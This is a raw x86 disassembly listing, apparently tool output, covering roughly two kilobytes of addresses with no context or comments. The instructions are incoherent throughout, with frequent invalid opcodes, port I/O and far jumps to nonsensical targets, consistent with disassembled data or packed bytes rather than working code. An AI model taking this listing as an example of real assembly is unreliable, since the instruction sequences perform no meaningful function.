  41281e:	(bad)  
  41281f:	lock ins BYTE PTR es:[edi],dx
  412821:	sbb    eax,0xabff2e57
  412826:	mov    ecx,0x57068be
  41282b:	aam    0x19
  41282d:	iret   
  41282e:	ins    DWORD PTR es:[edi],dx
  41282f:	adc    al,0xfd
  412831:	hlt    
  412832:	push   0x56
  412834:	lea    esi,ds:0x73904a01
  41283a:	out    0x9b,eax
  41283c:	int3   
  41283d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283e:	(bad)  
  41283f:	cmc    
  412840:	pusha  
  412841:	pop    edx
  412842:	pusha  
  412843:	push   ebx
  412844:	mov    edx,0x3f04dac9
  412849:	adc    DWORD PTR [edx+0x2a],edi
  41284c:	xchg   esp,eax
  41284d:	xor    BYTE PTR ds:0x8f6a8c12,bl
  412853:	push   es
  412854:	xchg   esi,eax
  412855:	jge    0x412864
  412857:	xor    DWORD PTR [esi-0x29],ecx
  41285a:	push   ecx
  41285b:	mov    eax,ebx
  41285d:	jno    0x41287b
  41285f:	lock fst QWORD PTR [eax]
  412862:	mov    ds,esp
  412864:	inc    eax
  412865:	inc    edi
  412866:	xor    BYTE PTR [ecx+0x3b],dl
  412869:	es jnp 0x4128b0
  41286c:	cmp    eax,0x29c7b9e9
  412871:	mov    cl,dh
  412873:	or     al,0x34
  412875:	cmp    esi,esi
  412877:	lea    edx,[edi]
  412879:	jno    0x41289b
  41287b:	mov    al,0xdd
  41287d:	imul   edi,DWORD PTR [edi+eax*2],0xa4c08025
  412884:	mov    bh,0x96
  412886:	jne    0x412816
  412888:	or     ch,BYTE PTR [ebx+0xf37b73d]
  41288e:	sub    cl,al
  412890:	call   0x402f0d78
  412895:	sub    dh,ch
  412897:	icebp  
  412898:	daa    
  412899:	sar    DWORD PTR [edi],1
  41289b:	xchg   edi,eax
  41289c:	inc    esi
  41289d:	popf   
  41289e:	jae    0x4128a5
  4128a0:	cmp    eax,DWORD PTR [esi+0x72]
  4128a3:	dec    ecx
  4128a4:	bound  eax,QWORD PTR [esi-0x36b0e9b]
  4128aa:	cs retf 
  4128ac:	jns    0x41283d
  4128ae:	xor    DWORD PTR [esi+0x6d],eax
  4128b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128b2:	dec    ebx
  4128b3:	add    al,0x7b
  4128b5:	outs   dx,DWORD PTR ds:[esi]
  4128b6:	ret    0x954a
  4128b9:	shl    BYTE PTR [eax-0x5e143b07],cl
  4128bf:	push   cs
  4128c0:	jp     0x412860
  4128c2:	xor    BYTE PTR [ecx+edi*4+0x7a],0xb8
  4128c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128c8:	jmp    0xff8ba136
  4128cd:	cld    
  4128ce:	pop    esp
  4128cf:	push   es
  4128d0:	or     eax,0xc408c0d8
  4128d5:	or     BYTE PTR [edi],dl
  4128d7:	dec    ecx
  4128d8:	mov    cl,0x3a
  4128da:	sahf   
  4128db:	daa    
  4128dc:	dec    edx
  4128dd:	outs   dx,DWORD PTR ds:[esi]
  4128de:	bnd jmp 0x412922
  4128e1:	push   ebx
  4128e2:	adc    ebx,eax
  4128e4:	push   edi
  4128e5:	shl    DWORD PTR ds:0xe87b392f,cl
  4128eb:	adc    eax,0x8f927df4
  4128f0:	fs in  eax,dx
  4128f2:	and    bl,BYTE PTR [esi+0x63648c29]
  4128f8:	clc    
  4128f9:	jbe    0x41291a
  4128fb:	push   es
  4128fc:	add    cl,BYTE PTR [eax+edi*2-0x1ec1a326]
  412903:	out    0x6c,eax
  412905:	sub    DWORD PTR [ebx],edi
  412907:	mov    edx,0xb12b22dc
  41290c:	jmp    0x8333:0xc113409
  412913:	aam    0xee
  412915:	(bad)
  412918:	scas   al,BYTE PTR es:[edi]
  412919:	shl    esp,cl
  41291b:	cmp    al,0x7f
  41291d:	popf   
  41291e:	mov    cl,0x62
  412920:	in     eax,dx
  412921:	sahf   
  412922:	push   ss
  412923:	in     al,dx
  412924:	inc    ecx
  412925:	stos   DWORD PTR es:[edi],eax
  412926:	or     cl,BYTE PTR [edi+0x23]
  412929:	pop    ds
  41292a:	(bad)  
  41292b:	lods   eax,DWORD PTR ds:[esi]
  41292c:	out    0xaa,al
  41292e:	ins    DWORD PTR es:[edi],dx
  41292f:	sub    al,BYTE PTR [ebp+0x71380b77]
  412935:	fwait
  412936:	vxorps ymm6,ymm5,YMMWORD PTR [esi-0x76]
  41293b:	cmp    BYTE PTR [ebx-0x53e92338],0x1c
  412942:	add    BYTE PTR [edi-0xcf848a0],al
  412948:	ds out dx,eax
  41294a:	sub    dl,dh
  41294c:	cmp    eax,0xd68a743e
  412951:	jb     0x4128e5
  412953:	mov    ch,0xaa
  412955:	popf   
  412956:	inc    ecx
  412957:	dec    esp
  412958:	xor    BYTE PTR [ebp+0x71],bh
  41295b:	outs   dx,DWORD PTR ds:[esi]
  41295c:	fstp   QWORD PTR [eax-0x5f]
  41295f:	adc    bl,BYTE PTR [edi]
  412961:	adc    al,0x80
  412963:	push   edi
  412964:	jmp    0x38c1:0x40f736a5
  41296b:	arpl   di,ax
  41296d:	xor    DWORD PTR [ecx-0x14],edx
  412970:	xor    esp,esi
  412972:	je     0x41292a
  412974:	sbb    DWORD PTR ds:0xb74e7dbc,edi
  41297a:	push   ebx
  41297b:	inc    ebp
  41297c:	mov    dh,0xf
  41297e:	xchg   edx,ecx
  412980:	aaa    
  412981:	test   al,0xc5
  412983:	sbb    al,0xb4
  412985:	sbb    eax,0x3ce73d85
  41298a:	dec    eax
  41298b:	mov    ebp,0x56b0ac4e
  412990:	xor    DWORD PTR [ecx],0xed7cfd2d
  412996:	xor    ecx,DWORD PTR [eax-0x34ea560]
  41299c:	and    ebx,ebp
  41299e:	mov    ah,0x7c
  4129a0:	sub    BYTE PTR [eax],bh
  4129a2:	push   ds
  4129a3:	scas   eax,DWORD PTR es:[edi]
  4129a4:	sub    eax,0xc2067f5a
  4129a9:	ds je  0x4129f1
  4129ac:	mov    bh,0xc3
  4129ae:	sbb    cl,bl
  4129b0:	das    
  4129b1:	into   
  4129b2:	hlt    
  4129b3:	xchg   edi,eax
  4129b4:	call   0xf1a5:0x388c345e
  4129bb:	popa   
  4129bc:	iret   
  4129bd:	push   ebp
  4129be:	jecxz  0x4129ee
  4129c0:	push   eax
  4129c1:	cmp    eax,0x3b8f923d
  4129c6:	add    eax,0xd06afd27
  4129cb:	test   esi,eax
  4129cd:	push   esp
  4129ce:	retf   
  4129cf:	mov    BYTE PTR [ebx+ebp*4-0x59],ch
  4129d3:	stos   BYTE PTR es:[edi],al
  4129d4:	push   0x6c436ee5
  4129d9:	and    DWORD PTR [edi+edx*8],esp
  4129dc:	stos   DWORD PTR es:[edi],eax
  4129dd:	pop    edi
  4129de:	jg     0x412a34
  4129e0:	or     eax,0xe4cce01
  4129e5:	out    0x8a,al
  4129e7:	sub    DWORD PTR [esi+0x67],edi
  4129ea:	(bad)  
  4129eb:	sbb    eax,0x98844e43
  4129f0:	js     0x4129f8
  4129f2:	pop    ebp
  4129f3:	and    al,0x87
  4129f5:	loopne 0x412a14
  4129f7:	test   eax,0x8693fc1e
  4129fc:	jne    0x4129d9
  4129fe:	mov    ch,0x1f
  412a00:	lds    edi,FWORD PTR [ebp-0x27e7c048]
  412a06:	jne    0x412a17
  412a08:	call   0xd925:0xd168c75f
  412a0f:	xlat   BYTE PTR ds:[ebx]
  412a10:	(bad)  
  412a11:	rol    DWORD PTR [esi-0x78833dc3],cl
  412a17:	dec    edx
  412a18:	out    0xec,eax
  412a1a:	dec    ecx
  412a1b:	loope  0x4129fd
  412a1d:	mov    ah,0xb3
  412a1f:	stc    
  412a20:	and    eax,0x695a151a
  412a25:	das    
  412a26:	icebp  
  412a27:	inc    ebx
  412a28:	test   eax,esi
  412a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a2b:	mov    cl,0x9d
  412a2d:	lods   eax,DWORD PTR ds:[esi]
  412a2e:	jecxz  0x412aa3
  412a30:	mov    ds:0x363eba8d,al
  412a35:	(bad)  
  412a36:	aad    0xcd
  412a38:	mov    edi,0xab0545f1
  412a3d:	jb     0x412a7f
  412a3f:	mov    ch,0x6e
  412a41:	in     al,0x88
  412a43:	xchg   edx,eax
  412a44:	in     eax,dx
  412a45:	fmul   QWORD PTR [eax]
  412a47:	jle    0x412a61
  412a49:	sti    
  412a4a:	(bad)  
  412a4b:	lods   eax,DWORD PTR ds:[esi]
  412a4c:	xchg   esi,eax
  412a4d:	mov    ds:0xeaed5644,al
  412a52:	loop   0x412a34
  412a54:	pop    es
  412a55:	fwait
  412a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a57:	repz fs dec edi
  412a5a:	bnd jno 0x412a30
  412a5d:	inc    ebx
  412a5e:	mov    bl,0x71
  412a60:	xor    eax,0x48e5191f
  412a65:	adc    al,0xcc
  412a67:	cmp    eax,0xafa68628
  412a6c:	test   BYTE PTR [ecx],bl
  412a6e:	push   esp
  412a6f:	clc    
  412a70:	mov    dh,0xc8
  412a72:	mov    ecx,0xf32071e6
  412a77:	inc    ebx
  412a78:	xor    dl,BYTE PTR [esi+0x75f064e1]
  412a7e:	mov    ds:0x78961448,eax
  412a83:	pop    edx
  412a84:	or     eax,0x760dd552
  412a89:	xchg   ebp,eax
  412a8a:	xor    eax,esp
  412a8c:	mov    esp,esi
  412a8e:	jno    0x412a8f
  412a90:	pop    edx
  412a91:	sbb    DWORD PTR [eax],esp
  412a93:	mov    cs,ebx
  412a95:	ins    DWORD PTR es:[edi],dx
  412a96:	and    ah,al
  412a98:	out    dx,eax
  412a99:	fidivr WORD PTR [ebp-0x6b]
  412a9c:	iret   
  412a9d:	aaa    
  412a9e:	retf   
  412a9f:	rol    DWORD PTR [ecx],cl
  412aa1:	sbb    bl,BYTE PTR [eax]
  412aa3:	xlat   BYTE PTR ds:[ebx]
  412aa4:	outs   dx,BYTE PTR fs:[esi]
  412aa6:	fcomp  QWORD PTR [esi+0x13]
  412aa9:	push   0xe2ae516f
  412aae:	stos   BYTE PTR es:[edi],al
  412aaf:	mov    ebx,0x8d407d24
  412ab4:	arpl   dx,di
  412ab6:	mov    DWORD PTR [eax-0x58],eax
  412ab9:	(bad)  
  412aba:	jns    0x412ae2
  412abc:	mov    ebp,DWORD PTR [ecx-0x3035aa33]
  412ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ac3:	push   edx
  412ac4:	(bad)  
  412ac5:	sbb    dh,BYTE PTR [ecx+0x31]
  412ac8:	inc    eax
  412ac9:	in     eax,0xa0
  412acb:	imul   ebp,DWORD PTR [ebx+esi*1-0x9],0xffffffe0
  412ad0:	xchg   esi,eax
  412ad1:	loop   0x412a94
  412ad3:	sbb    al,0x3a
  412ad5:	jae    0x412aeb
  412ad7:	test   DWORD PTR [ebp-0x3d25eee3],ebp
  412add:	out    dx,eax
  412ade:	pop    esp
  412adf:	xor    eax,DWORD PTR [ecx+0x4e705374]
  412ae5:	adc    eax,0xcd214faf
  412aea:	(bad)  
  412aeb:	addr16 or eax,ecx
  412aee:	aas    
  412aef:	sub    BYTE PTR [edx-0x31ac691],al
  412af5:	in     al,dx
  412af6:	into   
  412af7:	mov    esi,0xceac9413
  412afc:	mov    al,ds:0x668b54
  412b01:	loop   0x412aeb
  412b03:	dec    ebx
  412b04:	sub    esp,DWORD PTR [ecx+0xc1b8979]
  412b0a:	icebp  
  412b0b:	xor    al,0x1
  412b0d:	mov    WORD PTR [edx+0x30],cs
  412b10:	repz xchg esi,eax
  412b12:	loope  0x412b3b
  412b14:	into   
  412b15:	jle    0x412ac5
  412b17:	fcom   st(7)
  412b19:	cli    
  412b1a:	popa   
  412b1b:	aam    0x85
  412b1d:	inc    esi
  412b1e:	and    cl,dl
  412b20:	jmp    0x2726:0x611d5c94
  412b27:	shr    DWORD PTR [edi+edi*4+0x64c7c5de],1
  412b2e:	xor    bl,BYTE PTR [edx+edx*4-0x26]
  412b32:	iret   
  412b33:	and    DWORD PTR [edi-0x2a18db2d],esi
  412b39:	scas   al,BYTE PTR es:[edi]
  412b3a:	jne    0x412b62
  412b3c:	imul   esi,ecx,0x31
  412b3f:	inc    eax
  412b40:	sbb    DWORD PTR [ecx+eax*4-0x5fefe1e6],eax
  412b47:	mov    bh,0xf0
  412b49:	mov    esi,0x264265be
  412b4e:	repz test al,0x68
  412b51:	or     al,0x32
  412b53:	adc    BYTE PTR [ebp-0x40],dl
  412b56:	xor    BYTE PTR [ebp-0x3cc355e7],bh
  412b5c:	mov    es,WORD PTR [edi]
  412b5e:	je     0x412b79
  412b60:	data16 or dl,ah
  412b63:	lock scas al,BYTE PTR es:[edi]
  412b65:	cmp    al,0x1d
  412b67:	xchg   esi,eax
  412b68:	(bad)  
  412b69:	mov    ds,esp
  412b6b:	xor    ch,BYTE PTR [ecx-0x328023b4]
  412b71:	pusha  
  412b72:	loop   0x412bdf
  412b74:	xchg   DWORD PTR [edi-0x5cf089a9],eax
  412b7a:	sbb    DWORD PTR [edi-0x89c9f58],ecx
  412b80:	push   esi
  412b81:	jmp    0x2c4d:0x3ba7423c
  412b88:	loop   0x412bd4
  412b8a:	(bad)  
  412b8b:	scas   eax,DWORD PTR es:[edi]
  412b8c:	xchg   ebp,eax
  412b8d:	imul   esp,ebp,0xffffffc4
  412b90:	test   BYTE PTR [ebx+0x77],ah
  412b93:	(bad)
  412b96:	outs   dx,BYTE PTR ds:[esi]
  412b97:	js     0x412b2f
  412b99:	and    BYTE PTR [esp+ebx*8+0x16f2a2e8],ah
  412ba0:	stos   BYTE PTR es:[edi],al
  412ba1:	shl    al,1
  412ba3:	sar    BYTE PTR [ebx-0x2262927f],cl
  412ba9:	rol    DWORD PTR [ebp+0x5f],0x79
  412bad:	stos   BYTE PTR es:[edi],al
  412bae:	fcmovnu st,st(0)
  412bb0:	push   edi
  412bb1:	mov    dl,0x12
  412bb3:	addr16 push edx
  412bb5:	pop    ss
  412bb6:	ror    ch,cl
  412bb8:	mov    edx,0x3de75145
  412bbd:	mov    cl,0x9e
  412bbf:	push   0x44919a78
  412bc4:	sar    DWORD PTR [ebx+0xab7c103],0x71
  412bcb:	nop
  412bcc:	mov    gs,WORD PTR [edi]
  412bce:	mov    ds:0x92cab43b,eax
  412bd3:	push   ebp
  412bd4:	ins    BYTE PTR es:[edi],dx
  412bd5:	xchg   DWORD PTR [esi-0xd40b6de],edi
  412bdb:	jne    0x412c2e
  412bdd:	sbb    ah,al
  412bdf:	mov    dh,0x4c
  412be1:	cs push edx
  412be3:	ins    DWORD PTR es:[edi],dx
  412be4:	mov    ch,0xbf
  412be6:	pop    ss
  412be7:	xchg   DWORD PTR [edx-0x24648b33],ebp
  412bed:	push   0xca6c437c
  412bf2:	(bad)  
  412bf3:	das    
  412bf4:	sbb    al,ch
  412bf6:	mov    esi,0xc23771c8
  412bfb:	aad    0x35
  412bfd:	lahf   
  412bfe:	jge    0x412bfb
  412c00:	jmp    0x412b9e
  412c02:	outs   dx,DWORD PTR ds:[esi]
  412c03:	sbb    eax,0x3115684f
  412c08:	out    dx,eax
  412c09:	ja     0x412bcd
  412c0b:	mov    si,0x40ca
  412c0f:	es sahf 
  412c11:	add    DWORD PTR [ecx],edi
  412c13:	(bad)  
  412c14:	xor    dl,BYTE PTR [ecx-0x1b8076f5]
  412c1a:	mov    ds:0xa907c990,al
  412c1f:	push   es
  412c20:	mov    eax,ds:0x704e3e35
  412c25:	inc    ecx
  412c26:	pop    esi
  412c27:	or     edi,DWORD PTR [edi]
  412c29:	fild   DWORD PTR [edi]
  412c2b:	push   ss
  412c2c:	jb     0x412c70
  412c2e:	sbb    al,0x5
  412c30:	(bad)  
  412c31:	shl    bl,1
  412c33:	rcl    DWORD PTR [eax+0x76a5c702],cl
  412c39:	iret   
  412c3a:	pop    ebx
  412c3b:	or     BYTE PTR [edi+0x8fd8121],dh
  412c41:	jle    0x44e05a2
  412c47:	iret   
  412c48:	push   esp
  412c49:	xchg   edx,eax
  412c4a:	out    dx,eax
  412c4b:	or     al,BYTE PTR [esi]
  412c4d:	mov    esi,0x36d0c9d7
  412c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c53:	xor    BYTE PTR [esi+0x4fead9fe],0x38
  412c5a:	in     eax,dx
  412c5b:	scas   eax,DWORD PTR es:[edi]
  412c5c:	push   esp
  412c5d:	mov    ds:0xa618226c,al
  412c62:	into   
  412c63:	(bad)  
  412c64:	xchg   ecx,eax
  412c65:	push   ecx
  412c66:	jecxz  0x412c24
  412c68:	add    dh,BYTE PTR [edx+0x49]
  412c6b:	xchg   ecx,eax
  412c6c:	sub    dl,al
  412c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c6f:	mov    DWORD PTR [ecx+0x9],eax
  412c72:	test   al,0xd5
  412c74:	cmp    dh,BYTE PTR [eax+0x42f2269d]
  412c7a:	bnd jle 0x412c1a
  412c7d:	sub    al,BYTE PTR [edx]
  412c7f:	repnz add dh,BYTE PTR [ecx]
  412c82:	push   eax
  412c83:	hlt    
  412c84:	clc    
  412c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c86:	inc    esp
  412c87:	sub    al,0x2b
  412c89:	push   DWORD PTR [ebx]
  412c8b:	inc    edx
  412c8c:	mov    WORD PTR [ecx-0x30],fs
  412c8f:	cmp    ecx,DWORD PTR [ebx+0x4e635335]
  412c95:	xor    edi,DWORD PTR [ebx+0x55]
  412c98:	in     al,dx
  412c99:	icebp  
  412c9a:	stos   DWORD PTR es:[edi],eax
  412c9b:	inc    edi
  412c9c:	sar    ebp,0x1e
  412c9f:	fidiv  WORD PTR [esi+edi*8-0x2c]
  412ca3:	xchg   edi,eax
  412ca4:	cwde   
  412ca5:	pop    eax
  412ca6:	add    al,0xd7
  412ca8:	(bad)  [edx]
  412caa:	cmp    al,0x70
  412cac:	jo     0x412c90
  412cae:	xor    ebx,DWORD PTR [ecx-0x2c49abfc]
  412cb4:	clc    
  412cb5:	mov    cl,0x6f
  412cb7:	and    al,ch
  412cb9:	mov    ds:0x3c577b90,eax
  412cbe:	mov    bh,0xc8
  412cc0:	into   
  412cc1:	pushf  
  412cc2:	loop   0x412c89
  412cc4:	jne    0x412ce1
  412cc6:	inc    ecx
  412cc7:	inc    esp
  412cc8:	int3   
  412cc9:	sbb    eax,0x7b14d1d2
  412cce:	push   ebp
  412ccf:	xchg   ecx,eax
  412cd0:	daa    
  412cd1:	cmp    al,0xb0
  412cd3:	push   eax
  412cd4:	sub    al,bh
  412cd6:	mov    esp,0x9b493a37
  412cdb:	mov    bl,0x44
  412cdd:	mov    ecx,DWORD PTR [eax+0x54]
  412ce0:	push   ebx
  412ce1:	dec    eax
  412ce2:	inc    ebp
  412ce3:	test   eax,0xb31ad269
  412ce8:	bound  esi,QWORD PTR [edx+ecx*1+0x5a]
  412cec:	cmp    ah,BYTE PTR [ecx]
  412cee:	outs   dx,BYTE PTR ds:[esi]
  412cef:	retf   
  412cf0:	ss ret 
  412cf2:	mov    bl,0xea
  412cf4:	pop    esi
  412cf5:	(bad)  
  412cf6:	jmp    DWORD PTR [eax+0xd53f909]
  412cfc:	nop
  412cfd:	in     al,dx
  412cfe:	mov    edi,0x42a601e7
  412d03:	out    0x48,al
  412d05:	sub    dh,bl
  412d07:	in     eax,dx
  412d08:	mov    BYTE PTR [ecx+0xc],ch
  412d0b:	push   ecx
  412d0c:	repz mov esi,0x83577b69
  412d12:	xor    BYTE PTR [ebx],0xa6
  412d15:	ja     0x412cdc
  412d17:	lahf   
  412d18:	jne    0x412ce2
  412d1a:	inc    ebx
  412d1b:	fcmovne st,st(7)
  412d1d:	std    
  412d1e:	jne    0x412d61
  412d20:	mov    DWORD PTR [eax],esp
  412d22:	aaa    
  412d23:	jg     0x412d3f
  412d25:	pop    ebx
  412d26:	lahf   
  412d27:	inc    esp
  412d28:	mov    ds:0x460afce5,al
  412d2d:	sbb    al,0xe5
  412d2f:	dec    eax
  412d30:	jae    0x412d46
  412d32:	sub    DWORD PTR [edi],eax
  412d34:	aad    0xd9
  412d36:	pop    esi
  412d37:	sbb    di,dx
  412d3a:	fwait
  412d3b:	mov    esp,cs
  412d3d:	xchg   ebx,eax
  412d3e:	mov    ah,0xbc
  412d40:	and    ch,BYTE PTR [edx+0x22]
  412d43:	popa   
  412d44:	xchg   edi,eax
  412d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d46:	rol    DWORD PTR [eax+0x52],cl
  412d49:	pop    esp
  412d4a:	loopne 0x412dc8
  412d4c:	mov    bh,0x76
  412d4e:	jb     0x412d4f
  412d50:	mov    esi,0x5675abc2
  412d55:	push   0xffffffe1
  412d57:	shr    DWORD PTR [edx],0xf6
  412d5a:	adc    al,BYTE PTR [edx]
  412d5c:	inc    esp
  412d5d:	pop    ecx
  412d5e:	jbe    0x412d93
  412d60:	cld    
  412d61:	xchg   bl,cl
  412d63:	mov    al,ds:0x9e495f87
  412d68:	in     al,dx
  412d69:	cdq    
  412d6a:	or     eax,0xb0f988be
  412d6f:	push   DWORD PTR [eax-0x59]
  412d72:	cli    
  412d73:	aas    
  412d74:	(bad)  
  412d75:	jecxz  0x412db6
  412d77:	test   BYTE PTR [ecx+ebp*1],ah
  412d7a:	mov    ebx,0x17da4a34
  412d7f:	mov    esp,0xd88f820e
  412d84:	jge    0x412d64
  412d86:	das    
  412d87:	xor    eax,0x704e0c1c
  412d8c:	mov    BYTE PTR [edi],ah
  412d8e:	push   ebx
  412d8f:	mov    BYTE PTR [ebx-0x63],ch
  412d92:	add    al,0x83
  412d95:	dec    esp
  412d96:	jmp    0x412d27
  412d98:	or     BYTE PTR [eax],ch
  412d9a:	into   
  412d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9c:	shl    DWORD PTR [ebx],1
  412d9e:	(bad)  
  412d9f:	out    dx,eax
  412da0:	sbb    dh,BYTE PTR [edi]
  412da2:	out    dx,eax
  412da3:	dec    edx
  412da4:	test   BYTE PTR [eax-0x6a58d12d],bl
  412daa:	push   ebx
  412dab:	nop
  412dac:	jmp    FWORD PTR [ebx]
  412dae:	in     eax,dx
  412daf:	dec    ecx
  412db0:	sub    bl,dh
  412db2:	ret    0x2426
  412db5:	and    al,0xa8
  412db7:	ss aaa 
  412db9:	retf   
  412dba:	push   edi
  412dbb:	das    
  412dbc:	test   al,0x7c
  412dbe:	or     esi,DWORD PTR [edi+0x1564ebf0]
  412dc4:	ins    BYTE PTR es:[edi],dx
  412dc5:	pop    ebx
  412dc6:	clc    
  412dc7:	ret    0x5387
  412dca:	adc    edx,DWORD PTR [ebp-0x30]
  412dcd:	sbb    dl,cl
  412dcf:	fucomip st,st(2)
  412dd1:	sub    al,0xc3
  412dd3:	add    eax,ecx
  412dd5:	bound  esp,QWORD PTR [ecx+0x7a53df80]
  412ddb:	sub    BYTE PTR [ecx],dl
  412ddd:	xchg   edx,eax
  412dde:	add    eax,0x8ec96679
  412de3:	inc    ebp
  412de4:	or     al,0x9
  412de6:	(bad)  
  412de7:	fisub  WORD PTR [eax-0x36]
  412dea:	daa    
  412deb:	or     eax,0x7e1905b6
  412df0:	leave  
  412df1:	jno    0x412e64
  412df3:	aam    0x96
  412df5:	fsub   st(7),st
  412df7:	(bad)  
  412df8:	pop    ecx
  412df9:	inc    esi
  412dfa:	dec    edx
  412dfb:	xor    esp,DWORD PTR [ecx-0x7512971d]
  412e01:	(bad)  
  412e02:	xor    ecx,DWORD PTR ds:[ebx]
  412e05:	std    
  412e06:	sub    dl,BYTE PTR [ebp+ecx*8-0xc]
  412e0a:	test   eax,0x41877430
  412e0f:	mov    ebp,0xe1615a67
  412e14:	or     al,0x8
  412e16:	out    0x5f,eax
  412e18:	mov    dh,0xff
  412e1a:	repnz cmp ecx,DWORD PTR [edx]
  412e1d:	xchg   edi,eax
  412e1e:	test   BYTE PTR [eax],0x2e
  412e21:	(bad)  
  412e22:	fwait
  412e23:	leave  
  412e24:	and    edx,edx
  412e26:	xor    BYTE PTR [edx+0x38f2a258],al
  412e2c:	in     eax,0xae
  412e2e:	pop    esp
  412e2f:	or     DWORD PTR [edi-0x52],0xffffffeb
  412e33:	pop    edi
  412e34:	sub    BYTE PTR [eax-0x17],bh
  412e37:	jl     0x412e44
  412e39:	pop    esp
  412e3a:	dec    edx
  412e3b:	jb     0x412e9a
  412e3d:	mov    ebx,0xf26f607
  412e42:	xchg   edx,eax
  412e43:	xchg   edi,eax
  412e44:	in     eax,dx
  412e45:	xchg   edx,eax
  412e46:	jmp    0x1cdbc086
  412e4b:	(bad)  
  412e4c:	mov    eax,ds:0xbdb28cdd
  412e51:	cmp    esp,eax
  412e53:	jmp    0xbbb9cc50
  412e58:	das    
  412e59:	loop   0x412e4b
  412e5b:	inc    esi
  412e5c:	test   DWORD PTR [ebp*2+0x52faa8c8],edx
  412e63:	mov    al,ds:0xe8ad7bb4
  412e68:	push   ss
  412e69:	cmp    DWORD PTR [eax+ecx*8+0xe],esp
  412e6d:	or     BYTE PTR [esi],bl
  412e6f:	sub    esp,DWORD PTR [edi-0x26]
  412e72:	(bad)  
  412e73:	imul   ecx,DWORD PTR [ecx+0x4baad4cb],0x56
  412e7a:	jno    0x412ef8
  412e7c:	pushf  
  412e7d:	je     0x412e2f
  412e7f:	out    dx,eax
  412e80:	and    eax,0xf40e0b3
  412e85:	mov    ds:0xe57fb4ad,eax
  412e8a:	loope  0x412e42
  412e8c:	xchg   ecx,eax
  412e8d:	repz mov edi,0x4f09b830
  412e93:	jns    0x412ed8
  412e95:	and    ecx,DWORD PTR [edi]
  412e97:	hlt    
  412e98:	or     al,0xeb
  412e9a:	mov    edi,0xb94bd279
  412e9f:	push   ebx
  412ea0:	or     BYTE PTR [eax],ah
  412ea2:	test   al,0x3b
  412ea4:	rcl    BYTE PTR [ecx-0x10d14c2d],1
  412eaa:	jle    0x412e61
  412eac:	xor    al,0xad
  412eae:	out    0xee,al
  412eb0:	pop    ecx
  412eb1:	stos   DWORD PTR es:[edi],eax
  412eb2:	iret   
  412eb3:	cdq    
  412eb4:	mov    ebx,0xf4f04393
  412eb9:	loop   0x412ef9
  412ebb:	mov    ch,0x17
  412ebd:	loopne 0x412eb4
  412ebf:	lods   eax,DWORD PTR ds:[esi]
  412ec0:	mov    bl,0x4
  412ec2:	fsubr  DWORD PTR [ebx]
  412ec4:	stc    
  412ec5:	mov    ah,0xaa
  412ec7:	arpl   WORD PTR [eax+ebp*2-0x4be538df],di
  412ece:	ss inc eax
  412ed0:	xchg   edx,eax
  412ed1:	sub    eax,0x6d203877
  412ed6:	sbb    al,0x5b
  412ed8:	enter  0x2089,0x48
  412edc:	outs   dx,BYTE PTR ds:[esi]
  412edd:	jae    0x412f1b
  412edf:	je     0x412e84
  412ee1:	xlat   BYTE PTR ds:[ebx]
  412ee2:	out    dx,eax
  412ee3:	ror    DWORD PTR [eax],0x5f
  412ee6:	(bad)  
  412ee8:	fst    QWORD PTR [eax]
  412eea:	fdivr  DWORD PTR [esi+edi*4-0x6e]
  412eee:	inc    edx
  412eef:	leave  
  412ef0:	sbb    BYTE PTR [ecx],ah
  412ef2:	xor    eax,0x8132593f
  412ef7:	jae    0x412e89
  412ef9:	jmp    0x412e86
  412efb:	sub    ebp,DWORD PTR [ecx]
  412efd:	out    dx,eax
  412efe:	sub    BYTE PTR [eax+0x6d9a97f],bl
  412f04:	dec    edx
  412f05:	repnz mov BYTE PTR [ecx-0x22],dh
  412f09:	push   esi
  412f0a:	in     eax,dx
  412f0b:	jmp    0x412f54
  412f0d:	add    edi,0xffffffc3
  412f10:	ins    DWORD PTR es:[edi],dx
  412f11:	out    0x50,al
  412f13:	jo     0x412e99
  412f15:	sbb    BYTE PTR [esi+0x45],cl
  412f18:	clc    
  412f19:	pop    ebx
  412f1a:	enter  0x8c9a,0xb0
  412f1e:	es stos BYTE PTR es:[edi],al
  412f20:	xchg   DWORD PTR [eax],esp
  412f22:	jl     0x412fa1
  412f24:	adc    ecx,esi
  412f26:	cli    
  412f27:	jmp    0x1fe0:0xbc49ebe8
  412f2e:	stos   BYTE PTR es:[edi],al
  412f2f:	fcomi  st,st(5)
  412f31:	jbe    0x412f77
  412f33:	sbb    esp,esi
  412f35:	fistp  WORD PTR [edx+eiz*4-0x27]
  412f39:	xchg   ecx,eax
  412f3a:	mov    al,0x80
  412f3c:	push   ds
  412f3d:	test   ebx,0x8b6c8f7a
  412f43:	popa   
  412f44:	xlat   BYTE PTR ds:[ebx]
  412f45:	lea    ebx,ds:[esi]
  412f48:	adc    eax,DWORD PTR [edi]
  412f4a:	inc    esi
  412f4b:	xor    al,0xf4
  412f4d:	int    0x81
  412f4f:	mov    ecx,0xf547db7
  412f54:	mov    ss,WORD PTR [edi-0x2d]
  412f57:	inc    ecx
  412f58:	cdq    
  412f59:	arpl   WORD PTR [edx+0x18930bd6],dx
  412f5f:	(bad)  
  412f60:	cli    
  412f61:	ds pop edi
  412f63:	lock mov al,ds:0x5c54149d
  412f69:	jb     0x412f9f
  412f6b:	mov    eax,0xefbd1496
  412f70:	xchg   DWORD PTR [edi-0x5e],ebp
  412f73:	mov    cl,0x76
  412f75:	das    
  412f76:	jge    0x412f91
  412f78:	sub    bh,BYTE PTR [ecx]
  412f7a:	mov    bl,0xb8
  412f7c:	pop    es
  412f7d:	repnz fisub WORD PTR [edx+0x2a]
  412f81:	je     0x412f33
  412f83:	jae    0x412f63
  412f85:	or     edx,ebp
  412f87:	sbb    al,0x4b
  412f89:	jnp    0x412fd1
  412f8b:	inc    eax
  412f8c:	scas   eax,DWORD PTR es:[edi]
  412f8d:	jns    0x412f4f
  412f8f:	inc    ebp
